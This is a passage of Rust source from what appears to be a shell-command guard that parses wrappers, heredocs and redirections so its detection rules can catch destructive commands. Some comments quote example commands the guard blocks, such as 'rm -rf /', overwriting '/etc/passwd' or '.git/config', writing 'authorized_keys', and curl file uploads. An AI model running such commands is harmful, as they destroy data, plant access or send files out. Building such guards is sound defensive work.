                Self::Command {
                    options_ended,
                    pending_value,
                },
                |_t| None,
            ),
            Self::Launcher {
                kind,
                options_ended,
                pending_value,
                operands_to_skip,
            } => {
                if pending_value {
                    return (
                        Self::Launcher {
                            kind,
                            options_ended,
                            pending_value: false,
                            operands_to_skip,
                        },
                        true,
                    );
                }
                if !options_ended {
                    if token == "--" {
                        return (
                            Self::Launcher {
                                kind,
                                options_ended: true,
                                pending_value: false,
                                operands_to_skip,
                            },
                            true,
                        );
                    }
                    if token.starts_with('-') && token != "-" {
                        return (
                            Self::Launcher {
                                kind,
                                options_ended,
                                pending_value: kind.option_takes_separate_value(token),
                                operands_to_skip,
                            },
                            true,
                        );
                    }
                }
                if operands_to_skip > 0 {
                    return (
                        Self::Launcher {
                            kind,
                            options_ended: true,
                            pending_value: false,
                            operands_to_skip: operands_to_skip - 1,
                        },
                        true,
                    );
                }
                (
                    Self::Launcher {
                        kind,
                        options_ended,
                        pending_value,
                        operands_to_skip,
                    },
                    false,
                )
            }
            Self::MiseExec {
                awaiting_subcommand,
                pending_value,
            } => {
                if pending_value {
                    // The previous modeled option consumes this token.
                    return (
                        Self::MiseExec {
                            awaiting_subcommand,
                            pending_value: false,
                        },
                        true,
                    );
                }
                // Option handling is shared with the normalizer's mise model
                // so the two engines cannot diverge (v0.9.1 review). Options
                // are recognized before `@`-bearing words: a token starting
                // with `-` is an option even when it contains `@`. Global
                // flags may precede the subcommand (`mise -v exec -- cmd`).
                if crate::normalize::mise_option_takes_separate_value(token) {
                    return (
                        Self::MiseExec {
                            awaiting_subcommand,
                            pending_value: true,
                        },
                        true,
                    );
                }
                if crate::normalize::mise_flag_consumes_nothing(token) {
                    return (
                        Self::MiseExec {
                            awaiting_subcommand,
                            pending_value: false,
                        },
                        true,
                    );
                }
                if awaiting_subcommand {
                    return if matches!(token, "exec" | "x") {
                        (
                            Self::MiseExec {
                                awaiting_subcommand: false,
                                pending_value: false,
                            },
                            true,
                        )
                    } else {
                        // `mise <other-subcommand>` (or an unknown global
                        // option) is not an exec wrapper.
                        (Self::None, false)
                    };
                }
                if token == "--" {
                    // The wrapped command starts at the next token.
                    return (Self::None, true);
                }
                if token.starts_with('-') {
                    // Unknown option (including `-c/--command`, an inline
                    // shell string): its arity is unmodeled, so the next
                    // word could be its value rather than the command
                    // (`mise exec -p echo rm -rf /` must not make `echo` the
                    // segment command and mask the `rm` as args-data). Let
                    // the option itself end wrapper handling — it is not a
                    // registry command, so nothing downstream is masked.
                    return (Self::None, false);
                }
                if token.contains('@') {
                    // TOOL@VERSION specs precede the command.
                    return (
                        Self::MiseExec {
                            awaiting_subcommand: false,
                            pending_value: false,
                        },
                        true,
                    );
                }
                // In mise's grammar the first bare word starts the wrapped
                // command.
                (Self::None, false)
            }
        }
    }
}

#[inline]
#[must_use]
fn consume_wrapper_token<F>(
    token: &str,
    state: WrapperState,
    takes_value: F,
) -> (WrapperState, bool)
where
    F: Fn(&str) -> Option<WrapperOptionValueMode>,
{
    let (options_ended, pending_value) = match state {
        WrapperState::Sudo {
            options_ended,
            pending_value,
        }
        | WrapperState::Env {
            options_ended,
            pending_value,
        }
        | WrapperState::Command {
            options_ended,
            pending_value,
        } => (options_ended, pending_value),
        // Launcher/MiseExec have dedicated consume paths in `consume_token`.
        WrapperState::None | WrapperState::Launcher { .. } | WrapperState::MiseExec { .. } => {
            return (state, false);
        }
    };

    if pending_value {
        return (
            set_wrapper_pending(state, options_ended, false),
            true, // skip value token
        );
    }

    if options_ended {
        return (state, false);
    }

    if token == "--" {
        return (
            set_wrapper_options_ended(state, true),
            true, // skip `--`
        );
    }

    if !token.starts_with('-') {
        return (state, false);
    }

    // Skip wrapper options. Some wrapper options take a value; skip that too.
    let pending_value = match takes_value(token) {
        Some(WrapperOptionValueMode::SeparateToken) => true,
        Some(WrapperOptionValueMode::Attached) | None => false,
    };

    (
        set_wrapper_pending(state, options_ended, pending_value),
        true,
    )
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum WrapperOptionValueMode {
    Attached,
    SeparateToken,
}

#[inline]
#[must_use]
const fn set_wrapper_options_ended(state: WrapperState, options_ended: bool) -> WrapperState {
    match state {
        WrapperState::Sudo { pending_value, .. } => WrapperState::Sudo {
            options_ended,
            pending_value,
        },
        WrapperState::Env { pending_value, .. } => WrapperState::Env {
            options_ended,
            pending_value,
        },
        WrapperState::Command { pending_value, .. } => WrapperState::Command {
            options_ended,
            pending_value,
        },
        WrapperState::None | WrapperState::Launcher { .. } | WrapperState::MiseExec { .. } => state,
    }
}

#[inline]
#[must_use]
const fn set_wrapper_pending(
    state: WrapperState,
    options_ended: bool,
    pending_value: bool,
) -> WrapperState {
    match state {
        WrapperState::Sudo { .. } => WrapperState::Sudo {
            options_ended,
            pending_value,
        },
        WrapperState::Env { .. } => WrapperState::Env {
            options_ended,
            pending_value,
        },
        WrapperState::Command { .. } => WrapperState::Command {
            options_ended,
            pending_value,
        },
        WrapperState::None | WrapperState::Launcher { .. } | WrapperState::MiseExec { .. } => state,
    }
}

#[inline]
#[must_use]
fn sudo_option_takes_value(token: &str) -> Option<WrapperOptionValueMode> {
    // Common sudo options that take an argument: -u user, -g group, -h host, -p prompt, -C num,
    // -r role, -D directory. These show up in automation and are important for correct wrapper stripping.
    const SHORT_VALUE_OPTS: &[&str] = &["-u", "-g", "-h", "-p", "-C", "-t", "-a", "-U", "-r", "-D"];
    const LONG_VALUE_OPTS: &[&str] = &[
        "--user", "--group", "--host", "--prompt", "--role", "--chdir",
    ];

    if token.starts_with("--") {
        for opt in LONG_VALUE_OPTS {
            if token == *opt {
                return Some(WrapperOptionValueMode::SeparateToken);
            }
            if token
                .strip_prefix(opt)
                .is_some_and(|rest| rest.starts_with('='))
            {
                return Some(WrapperOptionValueMode::Attached);
            }
        }
        return None;
    }

    for opt in SHORT_VALUE_OPTS {
        if token == *opt {
            return Some(WrapperOptionValueMode::SeparateToken);
        }
        if token.starts_with(opt) && token.len() > opt.len() {
            return Some(WrapperOptionValueMode::Attached);
        }
    }

    None
}

#[inline]
#[must_use]
fn env_option_takes_value(token: &str) -> Option<WrapperOptionValueMode> {
    // GNU env: -u NAME / --unset=NAME / -C DIR.
    const SHORT_VALUE_OPTS: &[&str] = &["-u", "-C"];
    const LONG_VALUE_OPTS: &[&str] = &["--unset", "--chdir"];

    if token.starts_with("--") {
        for opt in LONG_VALUE_OPTS {
            if token == *opt {
                return Some(WrapperOptionValueMode::SeparateToken);
            }
            if token
                .strip_prefix(opt)
                .is_some_and(|rest| rest.starts_with('='))
            {
                return Some(WrapperOptionValueMode::Attached);
            }
        }
        return None;
    }

    for opt in SHORT_VALUE_OPTS {
        if token == *opt {
            return Some(WrapperOptionValueMode::SeparateToken);
        }
        if token.starts_with(opt) && token.len() > opt.len() {
            return Some(WrapperOptionValueMode::Attached);
        }
    }

    None
}

#[inline]
#[must_use]
fn command_option_is_query(token: &str) -> bool {
    if !token.starts_with('-') || token == "--" || token.starts_with("--") || token.len() <= 1 {
        return false;
    }

    token[1..].bytes().any(|b| b == b'v' || b == b'V')
}

#[inline]
#[must_use]
fn is_env_assignment(token: &str) -> bool {
    crate::normalize::is_env_assignment(token)
}

#[inline]
#[must_use]
pub(crate) fn is_search_command(cmd: &str) -> bool {
    let base_name = cmd.rsplit('/').next().unwrap_or(cmd);
    matches!(base_name, "rg" | "grep" | "ag" | "ack" | "sed")
}

#[inline]
#[must_use]
pub(crate) fn is_search_pattern_flag(cmd: &str, flag: &str) -> bool {
    let base_name = cmd.rsplit('/').next().unwrap_or(cmd);
    match base_name {
        "rg" => matches!(flag, "-e" | "--regexp"),
        "grep" => matches!(flag, "-e" | "--regexp"),
        "ag" => matches!(flag, "-e" | "--pattern"),
        "ack" => matches!(flag, "-e" | "--pattern"),
        "sed" => matches!(flag, "-e" | "--expression"),
        _ => false,
    }
}

#[must_use]
pub(crate) fn flag_data_value_is_inert(cmd: &str, flag: &str, value: &str) -> bool {
    let base_name = cmd.rsplit('/').next().unwrap_or(cmd);
    if base_name == "curl"
        && matches!(
            flag,
            "-d" | "--data" | "--data-binary" | "--data-ascii" | "--data-urlencode"
        )
        && {
            let value = strip_matching_quotes(value.trim());
            value.starts_with('@')
                || value
                    .strip_prefix('"')
                    .is_some_and(|tail| tail.starts_with('@'))
        }
    {
        // curl interprets an @-prefixed value for these options as "read the
        // request body from this file" (or stdin for `@-`). It is executable
        // transfer evidence, not inert request text, and must remain visible
        // to outbound-upload policy packs.
        return false;
    }
    if base_name == "sed" && matches!(flag, "-e" | "--expression") {
        return sed_script_is_maskable(value);
    }
    true
}

/// Return true only for a sed program that is either inert or is evaluated by
/// the dedicated semantic execution pass in `evaluator`.
///
/// The semantic pass recursively evaluates direct `e` and `s///e` shell
/// payloads before ordinary pack matching, so masking those programs here
/// prevents their already-reviewed data arguments from being scanned a second
/// time as raw shell. File-writing `w`/`W` programs stay visible.
#[must_use]
fn sed_script_is_maskable(value: &str) -> bool {
    let script = strip_matching_quotes(value.trim());
    let bytes = script.as_bytes();

    // GNU sed's direct `e` command consumes the rest of its source line as a
    // shell command (and does not require whitespace after `e`). The evaluator
    // handles static and dynamic payloads separately before this mask is used.
    if bytes.first() == Some(&b'e') {
        return true;
    }

    if bytes.len() < 4 || bytes[0] != b's' {
        return false;
    }
    let delimiter = bytes[1];
    if delimiter == b'\\' || delimiter == b'\n' || delimiter == b'\r' {
        return false;
    }

    let Some(pattern_end) = find_unescaped_sed_delimiter(bytes, 2, delimiter) else {
        return false;
    };
    let Some(replacement_end) = find_unescaped_sed_delimiter(bytes, pattern_end + 1, delimiter)
    else {
        return false;
    };

    bytes[replacement_end + 1..].iter().all(|byte| {
        matches!(
            byte,
            b'0'..=b'9' | b'e' | b'g' | b'p' | b'i' | b'I' | b'm' | b'M'
        )
    })
}

fn strip_matching_quotes(value: &str) -> &str {
    if value.len() >= 2 {
        let bytes = value.as_bytes();
        if matches!(bytes[0], b'\'' | b'"') && bytes[value.len() - 1] == bytes[0] {
            return &value[1..value.len() - 1];
        }
    }
    value
}

fn find_unescaped_sed_delimiter(bytes: &[u8], start: usize, delimiter: u8) -> Option<usize> {
    let mut index = start;
    while index < bytes.len() {
        if bytes[index] == b'\\' {
            index = index.saturating_add(2);
            continue;
        }
        if bytes[index] == delimiter {
            return Some(index);
        }
        index += 1;
    }
    None
}

#[must_use]
fn split_flag_assignment(token: &str, token_start: usize) -> Option<(&str, Range<usize>)> {
    // Only consider tokens that start like a flag.
    if !token.starts_with('-') {
        return None;
    }

    let (flag, value) = token.split_once('=')?;
    if value.is_empty() {
        return None;
    }

    // Compute the byte range for the value part within the original command.
    // `split_once` is by bytes, so this is safe.
    let eq_offset = flag.len();
    let value_start = token_start + eq_offset + 1;
    let value_end = token_start + token.len();
    if value_start >= value_end {
        return None;
    }

    Some((flag, value_start..value_end))
}

#[must_use]
fn split_short_flag_attached_value(
    cmd: &str,
    token: &str,
    token_start: usize,
) -> Option<(&'static str, Range<usize>)> {
    if !token.starts_with('-') || token.starts_with("--") || token.len() <= 2 || token.contains('=')
    {
        return None;
    }

    let base_name = cmd.rsplit('/').next().unwrap_or(cmd);
    let bytes = token.as_bytes();
    let flags = bytes.get(1..)?;

    for (offset, b) in flags.iter().enumerate() {
        let unambiguous_slot = offset == 0
            || (base_name == "git"
                && *b == b'm'
                && flags[..offset]
                    .iter()
                    .all(|prefix| matches!(*prefix, b'a' | b's' | b'v' | b'q')));
        if !unambiguous_slot {
            continue;
        }
        let token_index = 1 + offset;
        let next_index = token_index + 1;
        if next_index >= bytes.len() {
            continue;
        }

        let Some(short_flag) = SAFE_STRING_REGISTRY
            .flag_data_pairs
            .iter()
            .filter(|entry| entry.command == base_name)
            .filter_map(|entry| entry.short_flag)
            .find(|short| short.as_bytes().get(1) == Some(b))
        else {
            continue;
        };

        let value_start = token_start + next_index;
        let value_end = token_start + token.len();
        if value_start >= value_end {
            continue;
        }

        return Some((short_flag, value_start..value_end));
    }

    None
}

#[must_use]
fn combined_short_data_flag_value(cmd: &str, token: &str) -> Option<&'static str> {
    // Handle combined short flags like `git commit -am "msg"` where `-m` consumes the next token.
    if !token.starts_with('-') || token.starts_with("--") || token.len() <= 2 || token.contains('=')
    {
        return None;
    }

    let base_name = cmd.rsplit('/').next().unwrap_or(cmd);
    let flags = token.as_bytes().get(1..)?;
    let last = flags.last()?;
    if base_name != "git"
        || *last != b'm'
        || !flags[..flags.len() - 1]
            .iter()
            .all(|prefix| matches!(*prefix, b'a' | b's' | b'v' | b'q'))
    {
        return None;
    }

    SAFE_STRING_REGISTRY
        .flag_data_pairs
        .iter()
        .filter(|entry| entry.command == base_name)
        .filter_map(|entry| entry.short_flag)
        .find(|short| short.as_bytes().get(1) == Some(last))
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SanitizeTokenKind {
    Word,
    Separator,
    Comment,
}

/// Returns the byte position of the first unquoted, unescaped `>` inside
/// `token`: bash ends the word there and opens a redirection, whatever
/// follows. Returns `None` when there is none, so plain-data arrows inside
/// quotes (`"user>admin"`) and escaped ones (`a\>b`) stay fully masked.
///
/// An earlier version split only when the target began with `/`, `~`, `$`
/// or a quote, which kept every RELATIVE target masked: `echo x >.git/config`
/// was allowed while `echo x > .git/config` denied under
/// `redirect-truncate-git-internals-relative`, and a `cd` into a protected
/// directory followed by `echo k >authorized_keys` could not be judged (#480).
///
/// Used by `sanitize_for_pattern_matching` to handle `echo`/`printf`
/// args of the form `data>/etc/passwd` where the dcg tokenizer keeps
/// the operator and target in a single word — without this split, the
/// whole token gets masked and the destructive regex never sees the
/// target.
#[inline]
fn glued_redirect_split_position(token: &str) -> Option<usize> {
    let bytes = token.as_bytes();
    if bytes.len() < 2 {
        return None;
    }

    let mut i = 0usize;
    let mut in_single = false;
    let mut in_double = false;
    while i + 1 < bytes.len() {
        match bytes[i] {
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            // `\>` is a literal `>`; inside double quotes `\` still escapes.
            b'\\' if !in_single => i += 1,
            b'>' if !in_single && !in_double => return Some(i),
            _ => {}
        }
        i += 1;
    }
    None
}

/// Returns true if `token` is a Bash redirection operator that belongs
/// to shell-syntax processing (not the command's argument stream).
/// Used by `sanitize_for_pattern_matching` to stop masking past
/// `echo > <path>` etc., where the path is the shell's redirect target
/// rather than echo's data argument.
///
/// Covers:
/// - Output: `>`, `>>` (append), `>|` (force overwrite ignoring noclobber)
/// - Combined: `&>` (stdout+stderr), `&>>` (stdout+stderr append)
/// - Read-write: `<>` (open file for both)
/// - FD-to-FD: `>&`, `<&`
/// - Numbered FDs for output: `N>`, `N>>`, `N>|`, `N>&`
/// - Numbered FDs for read-write / FD duplication: `N<>`, `N<&`
/// - Multi-digit (`10>`) and named (`{fd}>`) FD prefixes on all of the above
///
/// Excludes input-only operators (`<`, `<<`, `<<<`) — those don't
/// truncate a target and don't affect the destructive-rule blast
/// radius, so masking past them is fine.
#[inline]
fn is_shell_redirect_operator(token: &str) -> bool {
    let bytes = token.as_bytes();
    match bytes {
        // Untyped operators (no leading FD).
        b">" | b">>" | b">|" | b"&>" | b"&>>" | b">&" | b"<>" | b"<&" => true,
        // FD-qualified: `N>`, `N>>`, `N>|`, `N>&`, `N<>`, `N<&` where the FD
        // prefix is one or more ASCII digits (`1>`, `2>`, `10>`) or a Bash
        // varname allocation (`{fd}>`). Multi-digit and named FDs are rare but
        // fully functional — `echo x 10> <sensitive>` and
        // `echo x {v}>| <sensitive>` truncate exactly like `1>` — and the
        // `redirect-truncate-root-home` regex already models both prefixes, so
        // stopping the args-data masking here is what lets the rule see the
        // target at all.
        _ => match strip_fd_prefix(bytes) {
            Some(rest) => matches!(rest, b">" | b">>" | b">|" | b">&" | b"<>" | b"<&"),
            None => false,
        },
    }
}

/// Strips a Bash redirection FD prefix — one or more digits (`2`, `10`) or a
/// varname allocation (`{fd}`) — returning the operator bytes that follow.
/// Returns `None` when no complete prefix is present.
#[inline]
fn strip_fd_prefix(bytes: &[u8]) -> Option<&[u8]> {
    if bytes.first() == Some(&b'{') {
        let close = bytes.iter().position(|byte| *byte == b'}')?;
        let name = bytes.get(1..close)?;
        let valid = !name.is_empty()
            && matches!(name[0], b'A'..=b'Z' | b'a'..=b'z' | b'_')
            && name
                .iter()
                .all(|byte| byte.is_ascii_alphanumeric() || *byte == b'_');
        return if valid { bytes.get(close + 1..) } else { None };
    }
    let digits = bytes
        .iter()
        .take_while(|byte| byte.is_ascii_digit())
        .count();
    if digits == 0 {
        return None;
    }
    bytes.get(digits..)
}

#[inline]
fn is_ampersand_redirection_byte(bytes: &[u8], i: usize, len: usize) -> bool {
    debug_assert_eq!(bytes[i], b'&');
    (i + 1 < len && bytes[i + 1] == b'>') || (i > 0 && matches!(bytes[i - 1], b'<' | b'>'))
}

#[derive(Debug, Clone)]
struct SanitizeToken {
    kind: SanitizeTokenKind,
    byte_range: Range<usize>,
    has_inline_code: bool,
}

impl SanitizeToken {
    #[inline]
    #[must_use]
    fn text<'a>(&self, command: &'a str) -> Option<&'a str> {
        command.get(self.byte_range.clone())
    }
}

type SanitizeTokens = SmallVec<[SanitizeToken; 16]>;

fn tokenize_command(command: &str) -> SanitizeTokens {
    let bytes = command.as_bytes();
    let len = bytes.len();

    let mut tokens = SanitizeTokens::new();
    let mut i = 0;

    while i < len {
        // Skip whitespace, but STOP at newline (it's a separator)
        while i < len && bytes[i].is_ascii_whitespace() && bytes[i] != b'\n' {
            i += 1;
        }
        if i >= len {
            break;
        }

        // Newline is a separator
        if bytes[i] == b'\n' {
            tokens.push(SanitizeToken {
                kind: SanitizeTokenKind::Separator,
                byte_range: i..i + 1,
                has_inline_code: false,
            });
            i += 1;
            continue;
        }

        // PowerShell block comment `<# ... #>` (checked before separators so `<#`
        // wins over the `<` redirect operator). Masked so a destructive string
        // printed inside the comment does not match any pattern (.9.7).
        if i + 1 < len && bytes[i] == b'<' && bytes[i + 1] == b'#' {
            let start = i;
            i += 2; // skip `<#`
            while i + 1 < len && !(bytes[i] == b'#' && bytes[i + 1] == b'>') {
                i += 1;
            }
            if i + 1 < len && bytes[i] == b'#' && bytes[i + 1] == b'>' {
                i += 2; // consume closing `#>`
            } else {
                i = len; // unterminated block comment runs to EOF
            }
            tokens.push(SanitizeToken {
                kind: SanitizeTokenKind::Comment,
                byte_range: start..i,
                has_inline_code: false,
            });
            continue;
        }

        if let Some(end) = consume_separator_token(bytes, i, len, &mut tokens) {
            i = end;
            continue;
        }

        // Check for comment start. A carriage return or form feed is skipped
        // above like a blank, but the shell does not read either as one: a
        // `#` right after it is part of a word.
        if i < len && bytes[i] == b'#' && (i == 0 || !matches!(bytes[i - 1], b'\r' | b'\x0c')) {
            // Consume until newline
            let start = i;
            while i < len && bytes[i] != b'\n' {
                i += 1;
            }
            tokens.push(SanitizeToken {
                kind: SanitizeTokenKind::Comment,
                byte_range: start..i,
                has_inline_code: false,
            });
            continue;
        }

        let start = i;
        let (end, has_inline_code) = consume_word_token(command, bytes, i, len);
        i = end;

        if start < i {
            tokens.push(SanitizeToken {
                kind: SanitizeTokenKind::Word,
                byte_range: start..i,
                has_inline_code,
            });
        }
    }

    tokens
}

#[inline]
fn consume_separator_token(
    bytes: &[u8],
    i: usize,
    len: usize,
    tokens: &mut SanitizeTokens,
) -> Option<usize> {
    match bytes[i] {
        b'|' => {
            let end = if i + 1 < len && bytes[i + 1] == b'|' {
                i + 2
            } else {
                i + 1
            };
            tokens.push(SanitizeToken {
                kind: SanitizeTokenKind::Separator,
                byte_range: i..end,
                has_inline_code: false,
            });
            Some(end)
        }
        b';' => {
            tokens.push(SanitizeToken {
                kind: SanitizeTokenKind::Separator,
                byte_range: i..i + 1,
                has_inline_code: false,
            });
            Some(i + 1)
        }
        b'&' => {
            if is_ampersand_redirection_byte(bytes, i, len) {
                return None;
            }
            let end = if i + 1 < len && bytes[i + 1] == b'&' {
                i + 2
            } else {
                i + 1
            };
            tokens.push(SanitizeToken {
                kind: SanitizeTokenKind::Separator,
                byte_range: i..end,
                has_inline_code: false,
            });
            Some(end)
        }
        _ => None,
    }
}

#[must_use]
fn consume_word_token(command: &str, bytes: &[u8], mut i: usize, len: usize) -> (usize, bool) {
    let mut has_inline_code = false;

    while i < len {
        let b = bytes[i];

        if b.is_ascii_whitespace() {
            break;
        }

        if b == b'&' && is_ampersand_redirection_byte(bytes, i, len) {
            i += 1;
            continue;
        }

        if matches!(b, b'|' | b';' | b'&') {
            break;
        }

        match b {
            b'\\' => {
                // Handle CRLF escape (consumes 3 bytes: \, \r, \n)
                if i + 2 < len && bytes[i + 1] == b'\r' && bytes[i + 2] == b'\n' {
                    i += 3;
                } else {
                    // Skip escaped byte. This is conservative for UTF-8: if the escape
                    // is used with a multibyte char, this may desync, but we fail open
                    // (no masking) if slicing becomes invalid.
                    i = (i + 2).min(len);
                }
            }
            b'\'' => {
                // Single-quoted segment (no escapes)
                i += 1;
                while i < len && bytes[i] != b'\'' {
                    i += 1;
                }
                if i < len {
                    i += 1; // consume closing quote
                }
            }
            b'"' => {
                // Double-quoted segment (escapes + substitution)
                i += 1;
                while i < len {
                    match bytes[i] {
                        b'"' => {
                            i += 1;
                            break;
                        }
                        b'\\' => {
                            i = (i + 2).min(len);
                        }
                        b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                            has_inline_code = true;
                            i += 1; // Skip past (
                            // Note: we don't track nesting inside double quotes for simplicity
                            // This is conservative (treats more as potentially dangerous)
                        }
                        b'`' => {
                            has_inline_code = true;
                            i = consume_backticks(command, i);
                        }
                        _ => {
                            i += 1;
                        }
                    }
                }
            }
            b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                has_inline_code = true;
                i = consume_dollar_paren(command, i);
            }
            // `${x:- #}` is one word: a blank or a line end inside the braces
            // does not end it, so the `#` after one starts no comment.
            b'$' if i + 1 < len && bytes[i + 1] == b'{' => {
                let (end, inline) = consume_braced_parameter(command, i);
                has_inline_code |= inline;
                i = end;
            }
            b'<' | b'>' if i + 1 < len && bytes[i + 1] == b'(' => {
                has_inline_code = true;
                i = consume_process_substitution(command, i);
            }
            b'`' => {
                has_inline_code = true;
                i = consume_backticks(command, i);
            }
            _ => {
                i += 1;
            }
        }
    }

    (i, has_inline_code)
}

#[must_use]
fn consume_process_substitution(command: &str, start: usize) -> usize {
    let bytes = command.as_bytes();
    let len = bytes.len();

    debug_assert!(matches!(bytes.get(start), Some(b'<' | b'>')));
    debug_assert_eq!(bytes.get(start + 1), Some(&b'('));

    let mut i = start + 2;
    let mut depth: u32 = 1;

    while i < len {
        match bytes[i] {
            b'(' => {
                depth += 1;
                i += 1;
            }
            b')' => {
                if depth == 1 {
                    return i + 1;
                }
                depth = depth.saturating_sub(1);
                i += 1;
            }
            b'\\' => {
                i = (i + 2).min(len);
            }
            b'\'' => {
                i += 1;
                while i < len && bytes[i] != b'\'' {
                    i += 1;
                }
                if i < len {
                    i += 1;
                }
            }
            b'"' => {
                i += 1;
                while i < len {
                    match bytes[i] {
                        b'"' => {
                            i += 1;
                            break;
                        }
                        b'\\' => {
                            i = (i + 2).min(len);
                        }
                        b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                            i = consume_dollar_paren_recursive(command, i, 1);
                        }
                        _ => {
                            i += 1;
                        }
                    }
                }
            }
            _ => {
                i += 1;
            }
        }
    }

    len
}

#[must_use]
fn consume_dollar_paren(command: &str, start: usize) -> usize {
    consume_dollar_paren_recursive(command, start, 0)
}

fn consume_dollar_paren_recursive(command: &str, start: usize, recursion_depth: usize) -> usize {
    // Prevent stack overflow on pathological input
    if recursion_depth > 500 {
        return command.len(); // Fail safe: consume rest of command to ensure masking
    }

    let bytes = command.as_bytes();
    let len = bytes.len();

    debug_assert_eq!(bytes.get(start), Some(&b'$'));
    debug_assert_eq!(bytes.get(start + 1), Some(&b'('));

    let mut i = start + 2;
    let mut depth: u32 = 1;

    while i < len {
        match bytes[i] {
            b'(' => {
                depth += 1;
                i += 1;
            }
            b')' => {
                if depth == 1 {
                    // End of command substitution
                    return i + 1;
                }
                depth = depth.saturating_sub(1);
                i += 1;
            }
            b'\\' => {
                i = (i + 2).min(len);
            }
            b'\'' => {
                // Single quotes inside: consume until closing
                i += 1;
                while i < len && bytes[i] != b'\'' {
                    i += 1;
                }
                if i < len {
                    i += 1;
                }
            }
            b'"' => {
                // Double quotes inside: consume until closing, respecting escapes
                i += 1;
                while i < len {
                    match bytes[i] {
                        b'"' => {
                            i += 1;
                            break;
                        }
                        b'\\' => {
                            i = (i + 2).min(len);
                        }
                        b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                            // Recursively consume nested command substitution inside double quotes
                            // to ensure we don't treat its contents (like closing quotes) as ours.
                            i = consume_dollar_paren_recursive(command, i, recursion_depth + 1);
                        }
                        _ => {
                            i += 1;
                        }
                    }
                }
            }
            _ => {
                i += 1;
            }
        }
    }

    len
}

#[must_use]
fn consume_backticks(command: &str, start: usize) -> usize {
    let bytes = command.as_bytes();
    let len = bytes.len();

    debug_assert_eq!(bytes.get(start), Some(&b'`'));

    let mut i = start + 1;
    while i < len {
        match bytes[i] {
            b'\\' => {
                i = (i + 2).min(len);
            }
            b'`' => {
                i += 1;
                break;
            }
            _ => {
                i += 1;
            }
        }
    }
    i
}

/// End of the `${…}` parameter expansion whose `$` is at `start`, and whether
/// it holds a command substitution. The shell reads the expansion as part of
/// one word, blanks, `;` and `#` included, up to the `}` that closes it. As
/// in the shell, only a `${` nests (a plain `{` is an ordinary character),
/// and quotes, escapes and substitutions inside it are passed over whole, so
/// a `}` in them closes nothing.
///
/// Like the shell, it reads on across lines to the `}` that closes it (a
/// `#` on a later line inside it is no comment either), and to the end of
/// the input when none does, where the shell reports a syntax error and runs
/// nothing of the line. A heredoc body is raw text to the shell, so an
/// expansion opened in one does not run past its terminator line: the
/// readers take each body apart from the lines around it (see
/// [`heredoc_body_ranges`]).
#[must_use]
pub(crate) fn consume_braced_parameter(command: &str, start: usize) -> (usize, bool) {
    let bytes = command.as_bytes();
    let len = bytes.len();

    debug_assert_eq!(bytes.get(start..start + 2), Some(&b"${"[..]));

    let mut i = start + 2;
    let mut depth = 1usize;
    let mut has_inline_code = false;
    while i < len {
        match bytes[i] {
            b'\\' => i = (i + 2).min(len),
            b'$' if bytes.get(i + 1) == Some(&b'{') => {
                depth += 1;
                i += 2;
            }
            // `$'…'` takes backslash escapes, so `\'` does not close it.
            b'$' if bytes.get(i + 1) == Some(&b'\'') => {
                i += 2;
                while i < len && bytes[i] != b'\'' {
                    i += if bytes[i] == b'\\' { 2 } else { 1 };
                }
                i = (i + 1).min(len);
            }
            b'}' => {
                i += 1;
                depth -= 1;
                if depth == 0 {
                    return (i, has_inline_code);
                }
            }
            b'\'' => {
                i += 1;
                while i < len && bytes[i] != b'\'' {
                    i += 1;
                }
                i = (i + 1).min(len);
            }
            b'"' => {
                i += 1;
                while i < len {
                    match bytes[i] {
                        b'"' => {
                            i += 1;
                            break;
                        }
                        b'\\' => i = (i + 2).min(len),
                        b'$' if bytes.get(i + 1) == Some(&b'(') => {
                            has_inline_code = true;
                            i = consume_dollar_paren(command, i);
                        }
                        b'`' => {
                            has_inline_code = true;
                            i = consume_backticks(command, i);
                        }
                        _ => i += 1,
                    }
                }
            }
            b'$' if bytes.get(i + 1) == Some(&b'(') => {
                has_inline_code = true;
                i = consume_dollar_paren(command, i);
            }
            b'`' => {
                has_inline_code = true;
                i = consume_backticks(command, i);
            }
            _ => i += 1,
        }
    }
    (len, has_inline_code)
}

// =============================================================================
// Heredoc bodies
// =============================================================================

/// How many substitutions, quotes and expansions deep the heredoc scan follows
/// a command, and how many bodies deep the readers take bodies apart. Past
/// either, the readers keep their plain reading of the rest.
const HEREDOC_SCAN_MAX_DEPTH: usize = 64;

/// What the readers that take heredoc bodies apart (the sanitizer and the
/// classifier) may read for one command, in bytes: each reading of the
/// command or of a body spends its length. An ordinary command takes a few
/// times its length. Where bash and dash end a body at different lines, the
/// body is read under each rule set, and a body nested in a disputed one is
/// read once for each reading of its container, so nested disputes double the
/// work at every level. Past the budget a reader stops and trusts none of its
/// readings: the classifier checks every byte, and the sanitizer masks only
/// the quotes and other openers in body text (see [`heredoc_body_openers`]).
struct HeredocReadBudget {
    left: usize,
    exhausted: bool,
}

impl HeredocReadBudget {
    /// Readings of the command's length it may take beyond the slack.
    const LENGTHS: usize = 16;
    /// Bytes it may read beyond its multiple of the command's length.
    const SLACK: usize = 64 * 1024;

    fn for_command(command: &str) -> Self {
        Self {
            left: command
                .len()
                .saturating_mul(Self::LENGTHS)
                .saturating_add(Self::SLACK),
            exhausted: false,
        }
    }

    /// Spend a reading of `text`; `None`, from then on, once the budget is
    /// spent.
    fn spend(&mut self, text: &str) -> Option<()> {
        let left = self.left.checked_sub(text.len());
        self.left = left.unwrap_or(0);
        self.exhausted |= left.is_none();
        left.map(drop)
    }
}

/// The quotes and expansion openers in the text that any rule set reads as
/// heredoc body text, as one-byte ranges: each quote and backquote, the `$`
/// of `$(`, `${` and `$[`, and the `(` of `<(` and `>(`.
///
/// What the sanitizer masks when its readings run out of budget. A body is
/// raw text to the shell, but readers further on (segment splitting, word
/// scans) tokenize the sanitized command as shell: left in place, an
/// apostrophe in a body makes them take every command after the terminator
/// line for its contents. Blanking just these keeps every word of the body,
/// and of the command, visible to the packs. Other syntax in body text
/// (parentheses, braces, backslashes, comment signs) is kept: it opens
/// nothing that runs past a line, and the patterns that read a body run as a
/// script need it.
fn heredoc_body_openers(command: &str) -> SmallVec<[Range<usize>; 8]> {
    let bytes = command.as_bytes();
    let mut openers: SmallVec<[Range<usize>; 8]> = SmallVec::new();
